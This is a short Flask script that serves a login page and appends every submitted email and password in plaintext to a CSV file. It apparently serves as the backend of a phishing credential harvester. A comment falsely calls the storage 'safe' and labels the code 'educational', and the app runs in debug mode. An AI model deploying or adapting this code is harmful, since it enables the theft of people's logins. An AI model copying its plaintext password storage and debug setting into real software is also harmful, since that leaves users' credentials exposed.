from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(open('login.html').read())

@app.route('/register', methods=['POST'])
def register():
    email = request.form['email']
    password = request.form['password']
    
    # Save the credentials safely, this is just for educational purposes
    with open('credentials.csv', 'a') as file:
        file.write(f"{email},{password}\n")
    
    # Redirect back to home and show the message
    return redirect('/?message=E-mail and Password registered successfully')

if __name__ == '__main__':
    app.run(debug=True)